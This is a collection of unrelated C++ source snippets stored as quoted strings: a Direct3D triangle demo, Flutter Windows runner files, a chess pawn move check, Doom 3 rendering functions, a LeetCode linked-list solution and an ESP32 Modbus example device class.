    "#include \"Vertexium.hpp\"\n\nconst VERTEX VERTICES[3] =\n{\n    { 0.0f,  0.5f, 0.0f, { 0.0f, 0.0f, 1.0f, 1.0f }},   \n    {-0.5f, -0.5f, 0.0f, { 0.0f, 0.0f, 1.0f, 1.0f }},   \n    { 0.5f, -0.5f, 0.0f, { 0.0f, 0.0f, 1.0f, 1.0f }},\n\n};\n\n                                                           //forward decs\n                                            HWND hWnd; WNDCLASSEX wc; class D3D;\n\nint WINAPI WinMain(HINSTANCE hInstance,HINSTANCE hPrevInstance,LPSTR lpCmdLine,int nCmdShow)\n{\n    ZeroMemory(&wc, sizeof(WNDCLASSEX));\n\n                                            wc.cbSize = sizeof(WNDCLASSEX);\n                                            wc.style = CS_HREDRAW | CS_VREDRAW;\n                                            wc.lpfnWndProc = WinProc;\n                                            wc.hInstance = hInstance;\n                                            wc.hCursor = LoadCursor(NULL, IDC_ARROW);\n                                            wc.lpszClassName = L\"WindowClass\";\n\n    RegisterClassEx(&wc);\n\n    RECT wr = { 0, 0, 800, 600 };\n    AdjustWindowRect(&wr, WS_OVERLAPPEDWINDOW, FALSE);\n\n    hWnd = CreateWindowEx\n    (\n                                            NULL,\n                                            L\"WindowClass\",\n                                            L\"I Love Vertices <3\",\n                                            WS_OVERLAPPEDWINDOW,\n                                            300,\n                                            300,\n                                            800,\n                                            800,\n                                            NULL,\n                                            NULL,\n                                            hInstance,\n                                            NULL\n    );\n\n    ShowWindow(hWnd, nCmdShow);\n\n    D3D* myD3D = new D3D;\n    myD3D->InitD3D(hWnd);myD3D->CompileShaders();myD3D->CreateBuffers(VERTICES);myD3D->DebugMemoryAddressesAndCompilation();\n\n    MSG message;\n    while(1)\n    {\n        if(PeekMessage(&message, NULL,0,0,PM_REMOVE))\n        {\n            TranslateMessage(&message);\n            DispatchMessage(&message);\n\n            if (message.message == WM_QUIT)\n                break;\n        }\n        else\n        {\n            myD3D->RenderFrame();\n        }\n    }\n\n    myD3D->ReleaseD3D(myD3D->swapChain, myD3D->device, myD3D->context, myD3D->p_BackBuffer, myD3D->p_VertexShader, myD3D->p_PixelShader);\n    return message.wParam;\n}",
    "#include \"win32_window.h\"\n\n#include <dwmapi.h>\n#include <flutter_windows.h>\n\n#include \"resource.h\"\n\nnamespace {\n\n/// Window attribute that enables dark mode window decorations.\n///\n/// Redefined in case the developer's machine has a Windows SDK older than\n/// version 10.0.22000.0.\n/// See: https://docs.microsoft.com/windows/win32/api/dwmapi/ne-dwmapi-dwmwindowattribute\n#ifndef DWMWA_USE_IMMERSIVE_DARK_MODE\n#define DWMWA_USE_IMMERSIVE_DARK_MODE 20\n#endif\n\nconstexpr const wchar_t kWindowClassName[] = L\"FLUTTER_RUNNER_WIN32_WINDOW\";\n\n/// Registry key for app theme preference.\n///\n/// A value of 0 indicates apps should use dark mode. A non-zero or missing\n/// value indicates apps should use light mode.\nconstexpr const wchar_t kGetPreferredBrightnessRegKey[] =\n  L\"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Themes\\\\Personalize\";\nconstexpr const wchar_t kGetPreferredBrightnessRegValue[] = L\"AppsUseLightTheme\";\n\n// The number of Win32Window objects that currently exist.\nstatic int g_active_window_count = 0;\n\nusing EnableNonClientDpiScaling = BOOL __stdcall(HWND hwnd);\n\n// Scale helper to convert logical scaler values to physical using passed in\n// scale factor\nint Scale(int source, double scale_factor) {\n  return static_cast<int>(source * scale_factor);\n}\n\n// Dynamically loads the |EnableNonClientDpiScaling| from the User32 module.\n// This API is only needed for PerMonitor V1 awareness mode.\nvoid EnableFullDpiSupportIfAvailable(HWND hwnd) {\n  HMODULE user32_module = LoadLibraryA(\"User32.dll\");\n  if (!user32_module) {\n    return;\n  }\n  auto enable_non_client_dpi_scaling =\n      reinterpret_cast<EnableNonClientDpiScaling*>(\n          GetProcAddress(user32_module, \"EnableNonClientDpiScaling\"));\n  if (enable_non_client_dpi_scaling != nullptr) {\n    enable_non_client_dpi_scaling(hwnd);\n  }\n  FreeLibrary(user32_module);\n}\n\n}  // namespace\n\n// Manages the Win32Window's window class registration.\nclass WindowClassRegistrar {\n public:\n  ~WindowClassRegistrar() = default;\n\n  // Returns the singleton registrar instance.\n  static WindowClassRegistrar* GetInstance() {\n    if (!instance_) {\n      instance_ = new WindowClassRegistrar();\n    }\n    return instance_;\n  }\n\n  // Returns the name of the window class, registering the class if it hasn't\n  // previously been registered.\n  const wchar_t* GetWindowClass();\n\n  // Unregisters the window class. Should only be called if there are no\n  // instances of the window.\n  void UnregisterWindowClass();\n\n private:\n  WindowClassRegistrar() = default;\n\n  static WindowClassRegistrar* instance_;\n\n  bool class_registered_ = false;\n};\n\nWindowClassRegistrar* WindowClassRegistrar::instance_ = nullptr;\n\nconst wchar_t* WindowClassRegistrar::GetWindowClass() {\n  if (!class_registered_) {\n    WNDCLASS window_class{};\n    window_class.hCursor = LoadCursor(nullptr, IDC_ARROW);\n    window_class.lpszClassName = kWindowClassName;\n    window_class.style = CS_HREDRAW | CS_VREDRAW;\n    window_class.cbClsExtra = 0;\n    window_class.cbWndExtra = 0;\n    window_class.hInstance = GetModuleHandle(nullptr);\n    window_class.hIcon =\n        LoadIcon(window_class.hInstance, MAKEINTRESOURCE(IDI_APP_ICON));\n    window_class.hbrBackground = 0;\n    window_class.lpszMenuName = nullptr;\n    window_class.lpfnWndProc = Win32Window::WndProc;\n    RegisterClass(&window_class);\n    class_registered_ = true;\n  }\n  return kWindowClassName;\n}\n\nvoid WindowClassRegistrar::UnregisterWindowClass() {\n  UnregisterClass(kWindowClassName, nullptr);\n  class_registered_ = false;\n}\n\nWin32Window::Win32Window() {\n  ++g_active_window_count;\n}\n\nWin32Window::~Win32Window() {\n  --g_active_window_count;\n  Destroy();\n}\n\nbool Win32Window::Create(const std::wstring& title,\n                         const Point& origin,\n                         const Size& size) {\n  Destroy();\n\n  const wchar_t* window_class =\n      WindowClassRegistrar::GetInstance()->GetWindowClass();\n\n  const POINT target_point = {static_cast<LONG>(origin.x),\n                              static_cast<LONG>(origin.y)};\n  HMONITOR monitor = MonitorFromPoint(target_point, MONITOR_DEFAULTTONEAREST);\n  UINT dpi = FlutterDesktopGetDpiForMonitor(monitor);\n  double scale_factor = dpi / 96.0;\n\n  HWND window = CreateWindow(\n      window_class, title.c_str(), WS_OVERLAPPEDWINDOW,\n      Scale(origin.x, scale_factor), Scale(origin.y, scale_factor),\n      Scale(size.width, scale_factor), Scale(size.height, scale_factor),\n      nullptr, nullptr, GetModuleHandle(nullptr), this);\n\n  if (!window) {\n    return false;\n  }\n\n  UpdateTheme(window);\n\n  return OnCreate();\n}\n\nbool Win32Window::Show() {\n  return ShowWindow(window_handle_, SW_SHOWNORMAL);\n}\n\n// static\nLRESULT CALLBACK Win32Window::WndProc(HWND const window,\n                                      UINT const message,\n                                      WPARAM const wparam,\n                                      LPARAM const lparam) noexcept {\n  if (message == WM_NCCREATE) {\n    auto window_struct = reinterpret_cast<CREATESTRUCT*>(lparam);\n    S",
    "// Copyright (2024) Alvin Yu\n\n#include \"Pawn.hpp\"\n\n\nbool Pawn::move(int row, int col, int dRow, int dCol,\n                std::vector<std::vector<std::shared_ptr<Piece>>> board) {\n    int cRow = dRow - row;\n    int cCol = dCol - col;\n\n    // if (_ep) {_ep = false;}\n\n    // White Initial Double Move\n    if (cRow == -2 && cCol == 0 && row == 6) {\n        switch (color()) {\n            case White:\n                _ep = true;\n                return row == 6 && board[dRow][dCol] == nullptr;\n            case Black:\n                return false;\n        }\n    }\n\n    // Black Initial Double Move\n    if (cRow == 2 && cCol == 0 && row == 1) {\n        switch (color()) {\n            case Black:\n                _ep = true;\n                return row == 1 && board[dRow][dCol] == nullptr;\n            case White:\n                return false;\n        }\n    }\n\n    if (abs(cRow) > 1 || abs(cCol) > 1) return false;\n\n    if (abs(cCol) == 1 && abs(cRow) != 1) return false;\n\n    switch (color()) {\n        case White:\n            if (cRow == 1) return false;\n            break;\n        case Black:\n            if (cRow == -1) return false;\n            break;\n        default:\n            return false;\n    }\n\n    if (abs(cCol) == 1 && abs(cRow) == 1) {\n        if (board[dRow][dCol] != nullptr) {\n            return board[row][col]->color() != board[dRow][dCol]->color();\n        } else {\n            return false;\n        }\n    }\n\n    return board[dRow][dCol] == nullptr;\n}\n\n\n\n",
    "#include \"flutter_window.h\"\n\n#include <optional>\n\n#include \"flutter/generated_plugin_registrant.h\"\n\nFlutterWindow::FlutterWindow(const flutter::DartProject& project)\n    : project_(project) {}\n\nFlutterWindow::~FlutterWindow() {}\n\nbool FlutterWindow::OnCreate() {\n  if (!Win32Window::OnCreate()) {\n    return false;\n  }\n\n  RECT frame = GetClientArea();\n\n  // The size here must match the window dimensions to avoid unnecessary surface\n  // creation / destruction in the startup path.\n  flutter_controller_ = std::make_unique<flutter::FlutterViewController>(\n      frame.right - frame.left, frame.bottom - frame.top, project_);\n  // Ensure that basic setup of the controller was successful.\n  if (!flutter_controller_->engine() || !flutter_controller_->view()) {\n    return false;\n  }\n  RegisterPlugins(flutter_controller_->engine());\n  SetChildContent(flutter_controller_->view()->GetNativeWindow());\n\n  flutter_controller_->engine()->SetNextFrameCallback([&]() {\n    this->Show();\n  });\n\n  // Flutter can complete the first frame before the \"show window\" callback is\n  // registered. The following call ensures a frame is pending to ensure the\n  // window is shown. It is a no-op if the first frame hasn't completed yet.\n  flutter_controller_->ForceRedraw();\n\n  return true;\n}\n\nvoid FlutterWindow::OnDestroy() {\n  if (flutter_controller_) {\n    flutter_controller_ = nullptr;\n  }\n\n  Win32Window::OnDestroy();\n}\n\nLRESULT\nFlutterWindow::MessageHandler(HWND hwnd, UINT const message,\n                              WPARAM const wparam,\n                              LPARAM const lparam) noexcept {\n  // Give Flutter, including plugins, an opportunity to handle window messages.\n  if (flutter_controller_) {\n    std::optional<LRESULT> result =\n        flutter_controller_->HandleTopLevelWindowProc(hwnd, message, wparam,\n                                                      lparam);\n    if (result) {\n      return *result;\n    }\n  }\n\n  switch (message) {\n    case WM_FONTCHANGE:\n      flutter_controller_->engine()->ReloadSystemFonts();\n      break;\n  }\n\n  return Win32Window::MessageHandler(hwnd, message, wparam, lparam);\n}\n",
    "/*\n===========================================================================\n\nDoom 3 GPL Source Code\nCopyright (C) 1999-2011 id Software LLC, a ZeniMax Media company. \n\nThis file is part of the Doom 3 GPL Source Code (?Doom 3 Source Code?).  \n\nDoom 3 Source Code is free software: you can redistribute it and/or modify\nit under the terms of the GNU General Public License as published by\nthe Free Software Foundation, either version 3 of the License, or\n(at your option) any later version.\n\nDoom 3 Source Code is distributed in the hope that it will be useful,\nbut WITHOUT ANY WARRANTY; without even the implied warranty of\nMERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\nGNU General Public License for more details.\n\nYou should have received a copy of the GNU General Public License\nalong with Doom 3 Source Code.  If not, see <http://www.gnu.org/licenses/>.\n\nIn addition, the Doom 3 Source Code is also subject to certain additional terms. You should have received a copy of these additional terms immediately following the terms and conditions of the GNU General Public License which accompanied the Doom 3 Source Code.  If not, please request a copy in writing from id Software at the address below.\n\nIf you have questions concerning this license or the applicable additional terms, you may contact in writing id Software LLC, c/o ZeniMax Media Inc., Suite 120, Rockville, Maryland 20850 USA.\n\n===========================================================================\n*/\n\n#include \"precompiled.h\"\n#pragma hdrstop\n\n#include \"tr_local.h\"\n\n/*\n\n  back end scene + lights rendering functions\n\n*/\n\n\n/*\n=================\nRB_DrawElementsImmediate\n\nDraws with immediate mode commands, which is going to be very slow.\nThis should never happen if the vertex cache is operating properly.\n=================\n*/\nvoid RB_DrawElementsImmediate( const srfTriangles_t *tri ) {\n\n\tbackEnd.pc.c_drawElements++;\n\tbackEnd.pc.c_drawIndexes += tri->numIndexes;\n\tbackEnd.pc.c_drawVertexes += tri->numVerts;\n\n\tif ( tri->ambientSurface != NULL  ) {\n\t\tif ( tri->indexes == tri->ambientSurface->indexes ) {\n\t\t\tbackEnd.pc.c_drawRefIndexes += tri->numIndexes;\n\t\t}\n\t\tif ( tri->verts == tri->ambientSurface->verts ) {\n\t\t\tbackEnd.pc.c_drawRefVertexes += tri->numVerts;\n\t\t}\n\t}\n\n\tqglBegin( GL_TRIANGLES );\n\tfor ( int i = 0 ; i < tri->numIndexes ; i++ ) {\n\t\tqglTexCoord2fv( tri->verts[ tri->indexes[i] ].st.ToFloatPtr() );\n\t\tqglVertex3fv( tri->verts[ tri->indexes[i] ].xyz.ToFloatPtr() );\n\t}\n\tqglEnd();\n}\n\n\n/*\n================\nRB_DrawElementsWithCounters\n================\n*/\nvoid RB_DrawElementsWithCounters( const srfTriangles_t *tri ) {\n\n\tbackEnd.pc.c_drawElements++;\n\tbackEnd.pc.c_drawIndexes += tri->numIndexes;\n\tbackEnd.pc.c_drawVertexes += tri->numVerts;\n\n\tif ( tri->ambientSurface != NULL  ) {\n\t\tif ( tri->indexes == tri->ambientSurface->indexes ) {\n\t\t\tbackEnd.pc.c_drawRefIndexes += tri->numIndexes;\n\t\t}\n\t\tif ( tri->verts == tri->ambientSurface->verts ) {\n\t\t\tbackEnd.pc.c_drawRefVertexes += tri->numVerts;\n\t\t}\n\t}\n\n\tif ( tri->indexCache && r_useIndexBuffers.GetBool() ) {\n\t\tqglDrawElements( GL_TRIANGLES, \n\t\t\t\t\t\tr_singleTriangle.GetBool() ? 3 : tri->numIndexes,\n\t\t\t\t\t\tGL_INDEX_TYPE,\n\t\t\t\t\t\t(int *)vertexCache.Position( tri->indexCache ) );\n\t\tbackEnd.pc.c_vboIndexes += tri->numIndexes;\n\t} else {\n\t\tif ( r_useIndexBuffers.GetBool() ) {\n\t\t\tvertexCache.UnbindIndex();\n\t\t}\n\t\tqglDrawElements( GL_TRIANGLES, \n\t\t\t\t\t\tr_singleTriangle.GetBool() ? 3 : tri->numIndexes,\n\t\t\t\t\t\tGL_INDEX_TYPE,\n\t\t\t\t\t\ttri->indexes );\n\t}\n}\n\n/*\n================\nRB_DrawShadowElementsWithCounters\n\nMay not use all the indexes in the surface if caps are skipped\n================\n*/\nvoid RB_DrawShadowElementsWithCounters( const srfTriangles_t *tri, int numIndexes ) {\n\tbackEnd.pc.c_shadowElements++;\n\tbackEnd.pc.c_shadowIndexes += numIndexes;\n\tbackEnd.pc.c_shadowVertexes += tri->numVerts;\n\n\tif ( tri->indexCache && r_useIndexBuffers.GetBool() ) {\n\t\tqglDrawElements( GL_TRIANGLES, \n\t\t\t\t\t\tr_singleTriangle.GetBool() ? 3 : numIndexes,\n\t\t\t\t\t\tGL_INDEX_TYPE,\n\t\t\t\t\t\t(int *)vertexCache.Position( tri->indexCache ) );\n\t\tbackEnd.pc.c_vboIndexes += numIndexes;\n\t} else {\n\t\tif ( r_useIndexBuffers.GetBool() ) {\n\t\t\tvertexCache.UnbindIndex();\n\t\t}\n\t\tqglDrawElements( GL_TRIANGLES, \n\t\t\t\t\t\tr_singleTriangle.GetBool() ? 3 : numIndexes,\n\t\t\t\t\t\tGL_INDEX_TYPE,\n\t\t\t\t\t\ttri->indexes );\n\t}\n}\n\n\n/*\n===============\nRB_RenderTriangleSurface\n\nSets texcoord and vertex pointers\n===============\n*/\nvoid RB_RenderTriangleSurface( const srfTriangles_t *tri ) {\n\tif ( !tri->ambientCache ) {\n\t\tRB_DrawElementsImmediate( tri );\n\t\treturn;\n\t}\n\n\n\tidDrawVert *ac = (idDrawVert *)vertexCache.Position( tri->ambientCache );\n\tqglVertexPointer( 3, GL_FLOAT, sizeof( idDrawVert ), ac->xyz.ToFloatPtr() );\n\tqglTexCoordPointer( 2, GL_FLOAT, sizeof( idDrawVert ), ac->st.ToFloatPtr() );\n\n\tRB_DrawElementsWithCounters( tri );\n}\n\n/*\n===============\nRB_T_RenderTriangleSurface\n\n===============\n*/\nvoid RB_T_RenderTriangleSurface( const drawSurf_t *surf ) {\n\tRB_RenderTriangleSurface( surf->geo );\n}",
    "//237. Delete Node in a Linked List\n/*\nThere is a singly-linked list head and we want to delete a node node in it.\n\nYou are given the node to be deleted node. You will not be given access to the first node of head.\n\nAll the values of the linked list are unique, and it is guaranteed that the given node node is not the last node in the linked list.\n\nDelete the given node. Note that by deleting the node, we do not mean removing it from memory. We mean:\n\nThe value of the given node should not exist in the linked list.\nThe number of nodes in the linked list should decrease by one.\nAll the values before node should be in the same order.\nAll the values after node should be in the same order.\nCustom testing:\n\nFor the input, you should provide the entire linked list head and the node to be given node. node should not be the last node of the list and should be an actual node in the list.\nWe will build the linked list and pass the node to your function.\nThe output will be the entire list after calling your function.\n \n\nExample 1:\n\n\nInput: head = [4,5,1,9], node = 5\nOutput: [4,1,9]\nExplanation: You are given the second node with value 5, the linked list should become 4 -> 1 -> 9 after calling your function.\nExample 2:\n\n\nInput: head = [4,5,1,9], node = 1\nOutput: [4,5,9]\nExplanation: You are given the third node with value 1, the linked list should become 4 -> 5 -> 9 after calling your function.\n \n\nConstraints:\n\nThe number of the nodes in the given list is in the range [2, 1000].\n-1000 <= Node.val <= 1000\nThe value of each node in the list is unique.\nThe node to be deleted is in the list and is not a tail node.\n*/\n\n//Solution\n\n/**\n * Definition for singly-linked list.\n * struct ListNode {\n *     int val;\n *     ListNode *next;\n *     ListNode(int x) : val(x), next(NULL) {}\n * };\n */\nclass Solution {\npublic:\n    void deleteNode(ListNode* node) {\n        node->val=node->next->val;\n        node->next=node->next->next;\n    }\n};",
    "#include \"win32_window.h\"\n\n#include <dwmapi.h>\n#include <flutter_windows.h>\n\n#include \"resource.h\"\n\nnamespace {\n\n/// Window attribute that enables dark mode window decorations.\n///\n/// Redefined in case the developer's machine has a Windows SDK older than\n/// version 10.0.22000.0.\n/// See: https://docs.microsoft.com/windows/win32/api/dwmapi/ne-dwmapi-dwmwindowattribute\n#ifndef DWMWA_USE_IMMERSIVE_DARK_MODE\n#define DWMWA_USE_IMMERSIVE_DARK_MODE 20\n#endif\n\nconstexpr const wchar_t kWindowClassName[] = L\"FLUTTER_RUNNER_WIN32_WINDOW\";\n\n/// Registry key for app theme preference.\n///\n/// A value of 0 indicates apps should use dark mode. A non-zero or missing\n/// value indicates apps should use light mode.\nconstexpr const wchar_t kGetPreferredBrightnessRegKey[] =\n  L\"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Themes\\\\Personalize\";\nconstexpr const wchar_t kGetPreferredBrightnessRegValue[] = L\"AppsUseLightTheme\";\n\n// The number of Win32Window objects that currently exist.\nstatic int g_active_window_count = 0;\n\nusing EnableNonClientDpiScaling = BOOL __stdcall(HWND hwnd);\n\n// Scale helper to convert logical scaler values to physical using passed in\n// scale factor\nint Scale(int source, double scale_factor) {\n  return static_cast<int>(source * scale_factor);\n}\n\n// Dynamically loads the |EnableNonClientDpiScaling| from the User32 module.\n// This API is only needed for PerMonitor V1 awareness mode.\nvoid EnableFullDpiSupportIfAvailable(HWND hwnd) {\n  HMODULE user32_module = LoadLibraryA(\"User32.dll\");\n  if (!user32_module) {\n    return;\n  }\n  auto enable_non_client_dpi_scaling =\n      reinterpret_cast<EnableNonClientDpiScaling*>(\n          GetProcAddress(user32_module, \"EnableNonClientDpiScaling\"));\n  if (enable_non_client_dpi_scaling != nullptr) {\n    enable_non_client_dpi_scaling(hwnd);\n  }\n  FreeLibrary(user32_module);\n}\n\n}  // namespace\n\n// Manages the Win32Window's window class registration.\nclass WindowClassRegistrar {\n public:\n  ~WindowClassRegistrar() = default;\n\n  // Returns the singleton registrar instance.\n  static WindowClassRegistrar* GetInstance() {\n    if (!instance_) {\n      instance_ = new WindowClassRegistrar();\n    }\n    return instance_;\n  }\n\n  // Returns the name of the window class, registering the class if it hasn't\n  // previously been registered.\n  const wchar_t* GetWindowClass();\n\n  // Unregisters the window class. Should only be called if there are no\n  // instances of the window.\n  void UnregisterWindowClass();\n\n private:\n  WindowClassRegistrar() = default;\n\n  static WindowClassRegistrar* instance_;\n\n  bool class_registered_ = false;\n};\n\nWindowClassRegistrar* WindowClassRegistrar::instance_ = nullptr;\n\nconst wchar_t* WindowClassRegistrar::GetWindowClass() {\n  if (!class_registered_) {\n    WNDCLASS window_class{};\n    window_class.hCursor = LoadCursor(nullptr, IDC_ARROW);\n    window_class.lpszClassName = kWindowClassName;\n    window_class.style = CS_HREDRAW | CS_VREDRAW;\n    window_class.cbClsExtra = 0;\n    window_class.cbWndExtra = 0;\n    window_class.hInstance = GetModuleHandle(nullptr);\n    window_class.hIcon =\n        LoadIcon(window_class.hInstance, MAKEINTRESOURCE(IDI_APP_ICON));\n    window_class.hbrBackground = 0;\n    window_class.lpszMenuName = nullptr;\n    window_class.lpfnWndProc = Win32Window::WndProc;\n    RegisterClass(&window_class);\n    class_registered_ = true;\n  }\n  return kWindowClassName;\n}\n\nvoid WindowClassRegistrar::UnregisterWindowClass() {\n  UnregisterClass(kWindowClassName, nullptr);\n  class_registered_ = false;\n}\n\nWin32Window::Win32Window() {\n  ++g_active_window_count;\n}\n\nWin32Window::~Win32Window() {\n  --g_active_window_count;\n  Destroy();\n}\n\nbool Win32Window::Create(const std::wstring& title,\n                         const Point& origin,\n                         const Size& size) {\n  Destroy();\n\n  const wchar_t* window_class =\n      WindowClassRegistrar::GetInstance()->GetWindowClass();\n\n  const POINT target_point = {static_cast<LONG>(origin.x),\n                              static_cast<LONG>(origin.y)};\n  HMONITOR monitor = MonitorFromPoint(target_point, MONITOR_DEFAULTTONEAREST);\n  UINT dpi = FlutterDesktopGetDpiForMonitor(monitor);\n  double scale_factor = dpi / 96.0;\n\n  HWND window = CreateWindow(\n      window_class, title.c_str(), WS_OVERLAPPEDWINDOW,\n      Scale(origin.x, scale_factor), Scale(origin.y, scale_factor),\n      Scale(size.width, scale_factor), Scale(size.height, scale_factor),\n      nullptr, nullptr, GetModuleHandle(nullptr), this);\n\n  if (!window) {\n    return false;\n  }\n\n  UpdateTheme(window);\n\n  return OnCreate();\n}\n\nbool Win32Window::Show() {\n  return ShowWindow(window_handle_, SW_SHOWNORMAL);\n}\n\n// static\nLRESULT CALLBACK Win32Window::WndProc(HWND const window,\n                                      UINT const message,\n                                      WPARAM const wparam,\n                                      LPARAM const lparam) noexcept {\n  if (message == WM_NCCREATE) {\n    auto window_struct = reinterpret_cast<CREATESTRUCT*>(lparam);\n    S",
    "#include \"utils.h\"\n\n#include <flutter_windows.h>\n#include <io.h>\n#include <stdio.h>\n#include <windows.h>\n\n#include <iostream>\n\nvoid CreateAndAttachConsole() {\n  if (::AllocConsole()) {\n    FILE *unused;\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stdout)) {\n      _dup2(_fileno(stdout), 1);\n    }\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stderr)) {\n      _dup2(_fileno(stdout), 2);\n    }\n    std::ios::sync_with_stdio();\n    FlutterDesktopResyncOutputStreams();\n  }\n}\n\nstd::vector<std::string> GetCommandLineArguments() {\n  // Convert the UTF-16 command line arguments to UTF-8 for the Engine to use.\n  int argc;\n  wchar_t** argv = ::CommandLineToArgvW(::GetCommandLineW(), &argc);\n  if (argv == nullptr) {\n    return std::vector<std::string>();\n  }\n\n  std::vector<std::string> command_line_arguments;\n\n  // Skip the first argument as it's the binary name.\n  for (int i = 1; i < argc; i++) {\n    command_line_arguments.push_back(Utf8FromUtf16(argv[i]));\n  }\n\n  ::LocalFree(argv);\n\n  return command_line_arguments;\n}\n\nstd::string Utf8FromUtf16(const wchar_t* utf16_string) {\n  if (utf16_string == nullptr) {\n    return std::string();\n  }\n  int target_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      -1, nullptr, 0, nullptr, nullptr)\n    -1; // remove the trailing null character\n  int input_length = (int)wcslen(utf16_string);\n  std::string utf8_string;\n  if (target_length <= 0 || target_length > utf8_string.max_size()) {\n    return utf8_string;\n  }\n  utf8_string.resize(target_length);\n  int converted_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      input_length, utf8_string.data(), target_length, nullptr, nullptr);\n  if (converted_length == 0) {\n    return std::string();\n  }\n  return utf8_string;\n}\n",
    "//Copyright (c) 2024 Dominik M. Glogowski\n//\n//Permission is hereby granted, free of charge, to any person obtaining a copy\n//of this software and associated documentation files (the \"Software\"), to deal\n//in the Software without restriction, including without limitation the rights\n//to use, copy, modify, merge, publish, distribute, sublicense, and/or sell\n//copies of the Software, and to permit persons to whom the Software is\n//furnished to do so, subject to the following conditions:\n//\n//The above copyright notice and this permission notice shall be included in all\n//copies or substantial portions of the Software.\n//\n//THE SOFTWARE IS PROVIDED \"AS IS\", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE\n//SOFTWARE.\n\n#include \"SingleSlaveExampleDevice.h\"\n#include <ModbusErrorHelper.h>\n\nSingleSlaveExampleDevice::SingleSlaveExampleDevice(uint8_t address, uint8_t retries) : SlaveDevice(address, retries){\n\n}\n\nuint16_t SingleSlaveExampleDevice::readExampleSingleRegister() {\n    dynamic_modbus_master::slave::SlaveReturn<uint16_t> slaveReturn = readHolding<uint16_t>(1);\n    if (slaveReturn.error == dynamic_modbus_master::ModbusError::OK) {\n        return slaveReturn.data;\n    } else {\n        return -1;\n    }\n}\n\nuint32_t SingleSlaveExampleDevice::readExampleMultipleRegisters() {\n    dynamic_modbus_master::slave::SlaveReturn<uint32_t> slaveReturn = readHolding<uint32_t>(2);\n    if (slaveReturn.error == dynamic_modbus_master::ModbusError::OK) {\n        return slaveReturn.data;\n    } else {\n        return -1;\n    }\n}\n\nfloat SingleSlaveExampleDevice::readExampleFloat() {\n    dynamic_modbus_master::slave::SlaveReturn<float> slaveReturn = readHolding<float>(4);\n    if (slaveReturn.error == dynamic_modbus_master::ModbusError::OK) {\n        return slaveReturn.data;\n    } else {\n        return -1;\n    }\n}\n\nvoid SingleSlaveExampleDevice::writeExampleSingleRegister(uint16_t data) {\n    dynamic_modbus_master::ModbusError error = writeHolding(1, data);\n    if (error != dynamic_modbus_master::ModbusError::OK) {\n        ESP_LOGE(\"SingleSlaveExampleDevice\", \"Failed to write Data %s\", dynamic_modbus_master::ModbusErrorHelper::modbusErrorToName(error).c_str());\n    }\n}\n\nvoid SingleSlaveExampleDevice::writeExampleMultipleRegisters(uint32_t data) {\n    dynamic_modbus_master::ModbusError error = writeHolding(2, data);\n    if (error != dynamic_modbus_master::ModbusError::OK) {\n        ESP_LOGE(\"SingleSlaveExampleDevice\", \"Failed to write Data %s\", dynamic_modbus_master::ModbusErrorHelper::modbusErrorToName(error).c_str());\n    }\n}\n\nvoid SingleSlaveExampleDevice::writeExampleFloat(float data) {\n    dynamic_modbus_master::ModbusError error = writeHolding(4, data);\n    if (error != dynamic_modbus_master::ModbusError::OK) {\n        ESP_LOGE(\"SingleSlaveExampleDevice\", \"Failed to write Data %s\", dynamic_modbus_master::ModbusErrorHelper::modbusErrorToName(error).c_str());\n    }\n}\n\nuint16_t SingleSlaveExampleDevice::readExampleMultipleCoils() {\n    dynamic_modbus_master::slave::SlaveReturn<uint16_t> slaveReturn = readCoils<uint16_t>(1, 16);\n    if (slaveReturn.error != dynamic_modbus_master::ModbusError::OK) {\n        ESP_LOGE(\"SingleSlaveExampleDevice\", \"Failed to read Coils %s\", dynamic_modbus_master::ModbusErrorHelper::modbusErrorToName(slaveReturn.error).c_str());\n    }\n    return slaveReturn.data;\n}\n\nvoid SingleSlaveExampleDevice::writeExampleMultipleCoils(uint16_t coilStates) {\n    dynamic_modbus_master::ModbusError error = writeCoils(1, coilStates, 16);\n    if (error != dynamic_modbus_master::ModbusError::OK) {\n        ESP_LOGE(\"SingleSlaveExampleDevice\", \"Failed to write Coil %s\", dynamic_modbus_master::ModbusErrorHelper::modbusErrorToName(error).c_str());\n    }\n}\n\nbool SingleSlaveExampleDevice::readExampleSingleCoil() {\n    dynamic_modbus_master::slave::SlaveReturn<bool> slaveReturn = readCoils<bool>(0, 1);\n    if (slaveReturn.error != dynamic_modbus_master::ModbusError::OK) {\n        ESP_LOGE(\"SingleSlaveExampleDevice\", \"Failed to read Coil %s\", dynamic_modbus_master::ModbusErrorHelper::modbusErrorToName(slaveReturn.error).c_str());\n    }\n    return slaveReturn.data;\n}\n\nvoid SingleSlaveExampleDevice::writeExampleSingleCoil(bool state) {\n    dynamic_modbus_master::ModbusError error = writeCoils(0, state, 1);\n    if (error != dynamic_modbus_master::ModbusError::OK) {\n        ESP_LOGE(\"SingleSlaveExampleDevice\", \"Failed to write Coil %s\", dynamic_modbus_master::ModbusErrorHelper::modbusErrorToName(error).c_str());\n    }\n}\n\nbool SingleSlaveExampleDevice::readDiscreteInput() {\n    dynamic_modbus_master::slave::SlaveReturn<bool> slaveReturn = readDiscreteInputs<bool>(0)",
